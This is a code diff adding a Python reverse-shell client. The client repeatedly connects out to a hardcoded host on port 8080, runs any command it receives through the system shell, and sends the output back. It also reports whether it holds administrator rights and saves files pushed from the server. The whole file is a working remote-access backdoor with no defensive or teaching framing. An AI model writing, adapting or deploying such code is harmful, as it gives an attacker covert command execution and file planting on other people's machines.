@@ -1,0 +1,92 @@
+import socket
+import subprocess
+import sys
+import os
+import time
+
+from Client3 import tuneConnection
+
+
+def tuneconnection():
+    mysocket = socket.socket()
+    while True:
+        time.sleep(10)
+        try:
+            mysocket.connect(("10.3.129.66", 8080))
+            conn(mysocket)
+        except:
+            tuneconnection()
+
+def letSend(mysocket, path, fileName):
+    try:
+        os.makedirs(path, exist_ok=True)
+        full_path = os.path.join(path, fileName)
+        print(f"Receiving file and saving to: {full_path}")
+        with open(full_path, 'ab') as f:
+            while True:
+                bits = mysocket.recv(1024)
+                if not bits:
+                    break
+                if bits.endswith(b"DONE"):
+                    f.write(bits[:-4])  # Write everything except the DONE marker
+                    print(f"[+]: File received and saved as: {full_path}")
+                    break
+                if b"File not found" in bits:
+                    print("[-]: Couldn't find file.")
+                    break
+                if b"File is empty" in bits:
+                    print("[-]: File is empty.")
+                    break
+                if b"File transfer error" in bits:
+                    print("[-]: Error during transfer.")
+                    break
+                f.write(bits)
+    except Exception as e:
+        print(f"!ERR!: Error receiving file: {str(e)}")
+
+
+def conn(mysocket):
+    #mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        while True:
+            cmd = mysocket.recv(1024).decode(errors='ignore').strip()
+            if not cmd:
+                continue
+
+            if cmd.lower() == "term":
+                print("[+] Closing connection")
+                mysocket.close()
+                break
+
+            elif cmd == "checkUserLevel":
+                try:
+                    admin = 'admin' in os.popen('whoami /groups').read().lower() if sys.platform.startswith(
+                        "win") else os.geteuid() == 0
+                    perms = "[+] Administrator Privileges." if admin else "[-] User Privileges. (No Admin privileges)"
+                    mysocket.send(perms.encode())
+                except Exception as e:
+                    mysocket.send(f"[-] Some error occurred: {str(e)}".encode())
+
+
+            elif cmd.startswith("send"):
+                send, path,fileName = cmd.split("*")
+                try:
+                    letSend(mysocket, path, fileName)
+                except Exception as e:
+                    informToServer = "[-] some error Occured." + str(e)
+                    mysocket.send(informToServer.encode())
+
+            else:
+                CMD = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                output, error = CMD.communicate()
+                mysocket.send(output + error)
+
+    except Exception as e:
+        mysocket.send(f"[-] Error in : {str(e)}".encode())
+        mysocket.close()
+
+def main():
+    tuneconnection()
+
+if __name__ == "__main__":
+    main()
